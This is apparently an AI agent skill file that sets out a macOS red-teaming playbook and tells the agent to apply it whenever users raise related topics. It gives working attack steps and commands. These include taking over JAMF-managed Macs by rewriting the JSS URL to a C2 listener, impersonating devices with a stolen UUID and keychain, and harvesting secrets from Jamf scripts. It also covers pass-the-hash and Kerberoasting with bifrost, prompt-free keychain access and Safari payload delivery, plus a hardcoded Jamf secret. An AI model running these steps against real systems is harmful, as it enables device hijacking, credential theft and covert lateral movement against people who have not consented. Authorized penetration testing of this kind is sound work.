---
name: macos-red-teaming
description: macOS red teaming and offensive security operations. Use this skill whenever the user mentions macOS penetration testing, MDM abuse (JAMF, Kandji), Active Directory attacks on macOS, keychain extraction, or any macOS-specific offensive security tasks. This includes scenarios where the user wants to enumerate macOS systems, abuse MDM configurations, extract credentials from keychains, or perform AD-based attacks from macOS hosts.
---

# macOS Red Teaming

A comprehensive guide for offensive security operations on macOS systems, including MDM abuse, Active Directory attacks, and credential extraction.

## When to Use This Skill

Use this skill when:
- Performing penetration testing on macOS environments
- Abusing MDM configurations (JAMF Pro, Kandji, etc.)
- Enumerating Active Directory from macOS hosts
- Extracting credentials from macOS keychains
- Conducting red team operations in mixed macOS/Windows environments
- Analyzing macOS-specific attack vectors

## MDM Abuse

### Understanding MDM Capabilities

MDMs have extensive permissions including:
- Install, query, or remove profiles
- Install applications
- Create local admin accounts
- Set firmware passwords
- Change FileVault keys

### Using MDM as C2

To run your own MDM:
1. Get a CSR signed by a vendor (try https://mdmcert.download/)
2. Use [MicroMDM](https://github.com/micromdm/micromdm) for Apple devices
3. Upon MDM enrollment, the device adds the MDM's SSL cert as a trusted CA
4. You can then sign anything for the enrolled device

**Enrollment method:** Install a `mobileconfig` file as root, delivered via a `pkg` file (can be compressed in zip).

**Note:** Mythic agent Orthrus uses this technique.

### JAMF Pro Attacks

#### Self-Enrollment Discovery

Check if self-enrollment is enabled:
```bash
# Visit: https://<company-name>.jamfcloud.com/enroll/
# May ask for credentials to access
```

Use [JamfSniper.py](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) for password spraying attacks.

#### Device Authentication Secrets

The `jamf` binary historically contained a shared keychain secret: `jk23ucnq91jfu9aj`

Jamf persists as a LaunchDaemon in:
```
/Library/LaunchAgents/com.jamf.management.agent.plist
```

#### Device Takeover

The JSS URL is stored in:
```bash
/Library/Preferences/com.jamfsoftware.jamf.plist
```

View the configuration:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist
```

**Attack:** Drop a malicious `pkg` that overwrites this file, setting the URL to a C2 listener.

After changing the URL:
```bash
sudo jamf policy -id 0
```

#### JAMF Impersonation

To impersonate device-JAMF communication:

1. Get device UUID:
```bash
ioreg -d2 -c IOPlatformExpertDevice | awk -F" " '/IOPlatformUUID/{print $(NF-1)}'
```

2. Extract JAMF keychain from:
```
/Library/Application Support/Jamf/JAMF.keychain
```

3. Create a VM with the stolen Hardware UUID, disable SIP, drop the JAMF keychain, and hook the Jamf agent.

#### Secrets Stealing

Monitor for custom scripts:
```bash
# Scripts are placed here, executed, and removed:
/Library/Application Support/Jamf/tmp/
```

Monitor process arguments (no root needed):
```bash
ps aux | grep -i jamf
```

Use [JamfExplorer.py](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) to listen for new files and process arguments.

## Active Directory on macOS

### User Types

- **Local Users** — Managed by local OpenDirectory, not connected to AD
- **Network Users** — Volatile AD users requiring DC connection
- **Mobile Users** — AD users with local credential/file backup

### Enumeration Commands

```bash
# User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/[Domain]/All Domains" ls /Users
dscl "/Active Directory/[Domain]/All Domains" read /Users/[username]
dscacheutil -q user

# Computer enumeration
dscl "/Active Directory/[Domain]/All Domains" ls /Computers
dscl "/Active Directory/[Domain]/All Domains" read "/Computers/[compname]$"

# Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/[Domain]/All Domains" ls /Groups
dscl "/Active Directory/[Domain]/All Domains" read "/Groups/[groupname]"

# Domain information
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
dsconfigad -show
```

### Local Storage

User and group info stored in:
```
/var/db/dslocal/nodes/Default/
```

Example paths:
- User: `/var/db/dslocal/nodes/Default/users/mark.plist`
- Group: `/var/db/dslocal/nodes/Default/groups/admin.plist`

### Tools

- [**Machound**](https://github.com/XMCyber/MacHound) — Bloodhound extension for macOS AD relationships
- [**Bifrost**](https://github.com/its-a-feature/bifrost) — Kerberos operations via Heimdal krb5 APIs
- [**Orchard**](https://github.com/its-a-feature/Orchard) — JXA tool for AD enumeration

### Kerberos Attacks

#### Pass-the-Hash

Get TGT for specific user and service:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
       --hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```

Inject TGT into current session:
```bash
bifrost --action asktgt --username test_lab_admin \
       --hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
       --enctype aes256 --domain test.lab.local
```

#### Kerberoasting

```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
       --username [user] --hash [hash] --enctype [enctype]
```

Access shares with obtained tickets:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```

#### Computer$ Password

Extract from System keychain:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```

## Keychain Access

The macOS Keychain contains sensitive information. Access it without generating prompts to advance red team operations.

**See:** `macos-keychain.md` for detailed keychain extraction techniques.

## External Services Integration

macOS is often integrated with external platforms:
- OneLogin synchronized credentials
- GitHub, AWS, and other services via SSO

Exploit these integrations for lateral movement.

## Safari Exploitation

Safari automatically opens "safe" downloaded files:
- ZIP files are automatically decompressed
- Use this behavior for payload delivery

## Quick Reference

### Essential Commands

```bash
# JAMF configuration
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

# Device UUID
ioreg -d2 -c IOPlatformExpertDevice | awk -F" " '/IOPlatformUUID/{print $(NF-1)}'

# AD enumeration
dscl "/Active Directory/[Domain]/All Domains" ls /Users

# Process monitoring
ps aux | grep -i jamf

# Domain info
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```

### Key Paths

```
/Library/Preferences/com.jamfsoftware.jamf.plist          # JAMF config
/Library/Application Support/Jamf/JAMF.keychain           # JAMF keychain
/Library/Application Support/Jamf/tmp/                    # JAMF scripts
/Library/LaunchAgents/com.jamf.management.agent.plist     # JAMF daemon
/var/db/dslocal/nodes/Default/                           # Local user/group data
```

## References

- [Come to the Dark Side, We Have Apples](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [OBTS v3.0: An Attackers Perspective on Jamf Configurations](https://www.youtube.com/watch?v=ju1IYWUv4ZA)
- [MacHound Introduction](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [Active Directory Discovery with a Mac](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)
- [Jamf Attack Toolkit](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit)
- [MicroMDM](https://github.com/micromdm/micromdm)
- [Machound](https://github.com/XMCyber/MacHound)
- [Bifrost](https://github.com/its-a-feature/bifrost)
- [Orchard](https://github.com/its-a-feature/Orchard)
